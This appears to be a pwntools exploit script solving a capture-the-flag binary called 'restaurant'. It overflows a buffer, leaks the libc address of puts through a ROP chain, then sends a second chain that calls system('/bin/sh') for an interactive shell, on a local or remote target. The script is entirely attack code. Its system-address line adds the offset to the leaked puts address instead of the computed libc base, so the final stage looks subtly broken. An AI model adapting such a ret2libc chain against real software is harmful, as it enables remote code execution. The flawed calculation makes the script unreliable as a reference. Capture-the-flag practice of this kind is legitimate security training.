from pwn import *
import os
import time
os.system('clear')

def exploit(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './restaurant'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

lib = './libc.so.6' # set the libc library
libc = context.binary = ELF(lib, checksec=False)

sh = exploit()

padding = 40 

puts_plt = 0x0000000000400650 # elf.plt['puts']
info('Puts PLT: %#0x', puts_plt)

puts_got = elf.got['puts']
info('Puts GOT: %#0x', puts_got)

pop_rdi_gadget = 0x00000000004010a3
info('Pop RDI: %#0x', pop_rdi_gadget)

fill_addr = elf.sym['fill']
info('Fill address: %#0x', fill_addr)

p = flat([
    asm('nop') * padding, # add padding
    pop_rdi_gadget, 
    puts_got, # rdi is pointing to this (holds the 1st arg)
    puts_plt, # plt puts as a func exec plt got as the arg
    fill_addr # get back to fill func to prevent crash
])

sh.sendlineafter(b'>', b'1') # input 1
sh.sendlineafter(b'>', p) # send the payload

getLeaked = sh.recvline_startswith('Enjoy your')
# assume (little-endian) , grabbing the least significant bytes.
leakedLibc = unpack(getLeaked[-6:].ljust(8,b'\x00')) 
info('Leaked got.puts address: %#0x', leakedLibc)

# leaked got.put + puts in libc
libc_base = leakedLibc - libc.sym['puts'] # get the puts with pwntools
info('Libc base: %#0x', libc_base)

shell = next(libc.search(b'/bin/sh\x00')) # grab the 1st result from the libc
info('Shell: %#0x', shell)
bin_sh = libc_base + shell
info('/bin/sh address: %#0x', bin_sh)

system = leakedLibc + libc.sym['system']
info('System Address: %#0x', system)

pay = flat([
    #1st payload
    asm('nop') * padding,

    #2nd payload
    pop_rdi_gadget,
    bin_sh,
    system
])

sh.sendlineafter(b'>', pay)

sh.interactive()
